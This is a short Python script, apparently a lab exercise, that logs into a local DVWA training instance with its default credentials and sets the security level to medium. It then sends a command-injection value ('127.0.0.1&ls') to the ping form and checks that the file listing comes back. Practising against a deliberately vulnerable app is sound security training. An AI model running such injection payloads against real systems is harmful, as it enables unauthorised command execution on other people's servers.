import requests


"""get the cookie"""
URL = 'http://192.168.56.132/dvwa/login.php'
res = requests.get(url=URL)
cookies = res.cookies.get_dict()
print(cookies)

"""login to the site"""
URL2 = 'http://192.168.56.132/dvwa/login.php'
DATA2 = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
}
res2 = requests.post(url=URL2, data=DATA2, cookies=cookies)

"""change security level"""
URL5 = 'http://192.168.56.132/dvwa/security.php'
DATA5 = {
    'security': 'medium',
    'seclev_submit': 'Submit',
}

res5 = requests.post(url=URL5, data=DATA5, cookies=cookies)
cookies5 = res5.cookies.get_dict()
print(cookies5)

"""get the correct URL page"""
new_cookies = {'PHPSESSID': cookies['PHPSESSID'], 'security': 'medium'}
URL3 = 'http://192.168.56.132/dvwa/vulnerabilities/exec/'
res3 = requests.get(url=URL3, cookies=new_cookies)
if 'Ping for FREE' in res3.text:
    print('logged to => vulnerabilities/exec/')

"""post the correct URL page"""
URL4 = 'http://192.168.56.132/dvwa/vulnerabilities/exec/'
DATA4 = {
    'ip': '127.0.0.1&ls',
    'submit': 'submit',
}
sent = DATA4['ip']
res4 = requests.post(url=URL4, data=DATA4, cookies=new_cookies)
if 'index.php' in res4.text:
    print(f'sent => {sent} and got => index.php')
